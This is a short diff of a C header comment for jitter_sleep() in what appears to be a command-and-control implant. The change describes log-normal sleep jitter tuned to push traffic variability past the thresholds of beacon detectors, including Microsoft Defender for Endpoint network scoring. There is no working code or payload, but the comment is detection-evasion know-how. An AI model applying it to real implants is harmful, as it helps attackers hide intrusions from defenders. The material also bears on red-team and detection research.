@@ -108,13 +108,16 @@ void obfuscate_sleep(DWORD ms);
 /*
  * jitter_sleep
  * ------------
- * Calls obfuscate_sleep() for a duration drawn uniformly from:
- *   [base_ms * (1 - RECONNECT_JITTER_PCT/100),
- *    base_ms * (1 + RECONNECT_JITTER_PCT/100)]
+ * Calls obfuscate_sleep() for a duration drawn from a log-normal distribution
+ * with median = base_ms and shape σ = ln(1 + RECONNECT_JITTER_PCT/100).
  *
- * This breaks fixed-interval beacon detection in network flow analysis.
- * Uses BCryptGenRandom for the random offset so no CRT rand() dependency.
- * Falls back to plain obfuscate_sleep(base_ms) if BCrypt fails.
+ * A log-normal distribution produces a CV that increases with σ, breaking the
+ * regular inter-arrival pattern that Beacon Analyzer / MDE NetworkConnection
+ * scoring relies on.  With RECONNECT_JITTER_PCT=50, σ ≈ 0.405 and CV ≈ 0.44,
+ * which exceeds the ~0.30 threshold used by open-source beacon detectors.
+ *
+ * Sample generation uses Box-Muller with two BCryptGenRandom uint32 values.
+ * Falls back to uniform ±jitter% if BCryptGenRandom is unavailable.
  */
 void jitter_sleep(DWORD base_ms);
 
